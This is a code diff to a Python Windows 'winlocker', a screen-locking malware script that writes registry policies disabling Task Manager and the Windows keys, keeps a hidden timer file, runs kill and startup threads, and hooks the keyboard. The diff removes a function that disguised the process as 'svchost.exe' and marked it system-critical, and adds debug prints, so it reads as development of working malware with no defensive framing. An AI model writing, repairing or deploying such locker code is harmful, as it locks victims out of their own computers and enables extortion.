@@ -9,12 +9,6 @@ HOURS = 1
 TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
 tries = TRIES
 
-def hide():
-    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-    except: pass
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1,0,0)
-    except: pass
-
 def lock():
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
@@ -32,8 +26,6 @@ def lock():
 
 def unlock():
     try: keyboard.unhook_all()
-    except: pass
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0,0,0)
     except: pass
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
@@ -148,8 +140,8 @@ class Locker:
             self.e.delete(0, tk.END)
 
 if __name__ == "__main__":
+    print("WINLOCKER STARTING...")
     try:
-        hide()
         threading.Thread(target=kill, daemon=True).start()
         threading.Thread(target=timer_check, daemon=True).start()
         startup()
@@ -159,4 +151,5 @@ if __name__ == "__main__":
     except Exception as e:
         with open(os.path.join(os.environ['TEMP'], 'wl_error.log'), 'w', encoding='utf-8') as f:
             traceback.print_exc(file=f)
-        raise
+        print(f"ERROR: {e}")
+        input("Press Enter...")
